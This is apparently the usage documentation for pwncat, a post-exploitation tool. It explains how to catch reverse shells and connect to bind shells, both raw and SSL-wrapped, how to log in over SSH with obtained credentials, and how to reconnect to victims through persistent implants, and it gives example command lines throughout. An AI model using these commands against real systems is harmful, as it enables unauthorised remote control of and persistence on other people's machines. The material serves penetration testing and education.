Basic Usage
===========

There are two main operating modes while interacting with a victim in pwncat: remote and local. At any
given time, the prompt will include either ``(local)`` or ``(remote)`` to indicate the current mode.
When using local mode, you have access to pwncat-specific commands such as upload, download, use, run
and exit. In remote mode, you will have access to a platform-specific shell environment (e.g. bash or
powershell).

To toggle between these modes, you can use the ``C-d`` key combination. This combination is intercepted
by pwncat before being sent to the target when in remote mode. If you need to send a ``C-d``
combination directly to the target, you can use the ``C-k`` prefix. Prefixing ``C-d`` or ``C-k`` with
``C-k`` will tell pwncat to send the literaly ``C-d`` or ``C-k`` sequence to the target.

Command Line Interface and Start-up Sequence
--------------------------------------------

pwncat provides an entrypoint script which allows you to enter an unconnected pwncat prompt and
optionally immediately connect to a victim. The syntax for the pwncat entrypoint is largely identical
to the pwncat ``connect`` command. The arguments/syntax is described in the sections below.

In order to establish a connection, you must specify all needed channel arguments as well as specify
a platform name (e.g. ``linux`` or ``windows``). If no platform is specified, it is assumed to be
linux. This can cause hangs if connected to the incorrect platform.

C2 Channels
-----------

pwncat allows the use of a few different C2 channels when connecting to a victim. Originally, pwncat
wrapped a raw socket much like ``netcat`` with some extra features. As the framework was expanded, we have
moved toward abstracting this command and control layer away from the core pwncat features to allow
more ways of connection. Currently, only raw sockets and ``ssh`` are implemented. You can connect to a victim
with three different C2 protocols: ``bind``, ``connect``, and ``ssh``. The first two act like netcat. These
modes simply open a raw socket and assume there is a shell on the other end. In SSH mode, we legitimately
authenticate to the victim host with provided credentials and utilize the SSH shell channel as our C2 channel.

pwncat also implements SSL-wrapped versions of ``bind`` and ``connect`` protocols aptly named ``ssl-bind``
and ``ssl-connect``. These protocols function largely the same as bind/connect, except that they operate
over an encrypted SSL tunnel. You must use an encrypted bind or reverse shell on the victim side such
as ``ncat --ssl`` or `socat OPENSSL-LISTEN:`. For the ``ssl-bind`` protocol, you must also supply either
the ``--certificate`` argument pointing to a PEM formatted bundled certificate and key file or two
querystring parameters named ``certfile`` and ``keyfile``.

pwncat exposes these different C2 channel protocols via the ``protocol`` field of the connection string
discussed below.

Connecting to a Victim
----------------------

Connecting to a victim is accomplished through a connection string. Connection strings are versatile ways
to describe the parameters to a specific C2 Channel/Protocol. This looks something like:
``[protocol://][user[:password]]@[host:][port][?arg1=value&arg2=value]``

Each field in the connection string translates to a parameter passed to the C2 channel. Some channels don't
require all the parameters. For example, a ``bind`` or ``connect`` channel doesn't required a username or
a password. If there is not an explicit argument or parsed value within the above format, you can use the
query string arguments to specify arbitrary channel arguments. You cannot specify the same argument twice
(e.g. ``connect://hostname:1111?port=4444``).

If the ``protocol`` field is not specified, pwncat will attempt to figure out the correct protocol
contextually. The following rules apply:

- If a user and host are provided, assume ``ssh`` protocol
- If no user is provided but a host and port are provided, assume protocol is ``connect``
- If no user or host is provided (or host is ``0.0.0.0``) and the ``certfile`` or ``keyfile`` arguments are
  provided, protocol is assumed to be ``ssl-bind``
- If no user or host is provided (or host is ``0.0.0.0``), protocol is assumed to be ``bind``
- If a second positional integer parameter is specified, the protocol is assumed to be ``connect``
  - This is the ``netcat`` syntax seen in the below examples for the ``connect`` protocol.
- If the ``-l`` parameter is used and the ``certfile`` or ``keyfile`` arguments are provided, the protocol
  is assumed to be ``ssl-bind``.
- If the ``-l`` parameter is used alone, then the protocol is assumed to be ``bind``

Connecting to a victim bind shell
---------------------------------

In this case, the victim is running a raw bind shell on an open port. The victim must be available at an
address which is routable (e.g. not NAT'd). The ``connect`` protocol provides this capability.

.. code-block:: bash
    :caption: Connecting to a bind shell at 1.1.1.1:4444

    # netcat syntax
    pwncat 192.168.1.1 4444
    # Full connection string
    pwncat connect://192.168.1.1:4444
    # Connection string with assumed protocol
    pwncat 192.168.1.1:4444

Connecting to a victim encrypted bind shell
-------------------------------------------

In this case, the victim is running a ssl-wrapped bind shell on an open port. The victim must be available at an
address which is routable (e.g. not NAT'd). The ``ssl-connect`` protocol provides this capability.

.. code-block:: bash
    :caption: Connecting to a bind shell at 1.1.1.1:4444

    # Full connection string
    pwncat connect://192.168.1.1:4444

Catching a victim reverse shell
-------------------------------

In this case, the victim was exploited in such a way that they open a connection to your attacking host
on a specific port with a raw shell open on the other end. Your attacking host must be routable from the
victim machine. This mode is accessed via the ``bind`` protocol.

.. code-block:: bash
    :caption: Catching a reverse shell

    # netcat syntax
    pwncat -l 4444
    # Full connection string
    pwncat bind://0.0.0.0:4444
    # Assumed protocol
    pwncat 0.0.0.0:4444
    # Assumed protocol, assumed bind address
    pwncat :4444

Catching a victim encrypted reverse shell
-----------------------------------------

In this case, the victim was exploited in such a way that they open an ssl connection to your attacking host
on a specific port with a raw shell open on the other end. Your attacking host must be routable from the
victim machine. This mode is accessed via the ``ssl-bind`` protocol.

If using the ``--cert/--certificate`` argument, you must provided a combined certificate and key file in PEM
format. If your key and certificate are stored in separate files, you should specify the ``certfile`` and
``keyfile`` querystring arguments instead.

.. code-block:: bash
    :caption: Catching a reverse shell

    # netcat syntax
    pwncat -l --cert /path/to/cert.pem  4444
    # Full connection string
    pwncat ssl-bind://0.0.0.0:4444?certfile=/path/to/cert.pem&keyfile=/path/to/key.pem
    # Assumed protocol
    pwncat --cert /path/to/cert.pem 0.0.0.0:4444
    # Assumed protocol, assumed bind address
    pwncat --cert /path/to/cert.pem :4444

Connecting to a Remote SSH Server
---------------------------------

If you were able to obtain a valid password or private key for a remote user, you can initiate a pwncat
session with the remote host over SSH. This mode is accessed via the ``ssh`` protocol. A note about
protocol assumptions: if there is an installed persistence method for a given user, then specifying only
a user and host will first try reconnecting via that persistence method. Afterwards, an ssh connection
will be attempted. If you don't want this behavior, you should explicitly specify ``ssh://`` for your
protocol.

.. code-block:: bash
    :caption: Connection to a remote SSH server

    # SSH style syntax (assumed protocol, prompted for password)
    pwncat root@192.168.1.1
    # Full connection string with password
    pwncat "ssh://root:r00t5P@ssw0rd@192.168.1.1"
    # SSH style syntax w/ identity file
    pwncat -i ./root_id_rsa root@192.168.1.1

Connecting to a Windows Target
------------------------------

All of the above examples can also be used to connect to Windows targets as long as you explicitly specify
a platform during invocation. For example, to connect to a Windows bind shell at ``192.168.1.1:4444``:

.. code-block:: bash
    :caption: Connect to Windows bind shell

    # netcat syntax
    pwncat -m windows 192.168.1.1 4444
    # Full connection string
    pwncat -m windows connect://192.168.1.1:4444
    # Connection string with assumed protocol
    pwncat -m windows 192.168.1.1:4444

Reconnecting to a victim
------------------------

pwncat has the capability to install, track, and remove persistent implants on a target. If you had a
previous connect to a target, and installed a persistent implant, you can use the pwncat entrypoint
to list available implants and attempt to reconnect to a given target. Reconnecting can be accomplished
with either the IP address or unique host ID of a target.

.. code-block:: bash
    :caption: List Installed Persistent Implants

    pwncat --list

pwncat will attempt to reconnect to a host automatically if needed. Specifically, if no explicit protocol,
port, identity or password is specified, pwncat assumes you would like to be reconnected to the specified
host and attempts to reconnect via a matching implant prior to attempting direct connection.

.. code-block:: bash
    :caption: Reconnecting to a known host

    # Attempt reconnection as any user; specify host ID
    pwncat 999c434fe6bd7383f1a6cc10f877644d
    # Attempt reconnection first as the specified user
    pwncat user@192.168.1.1
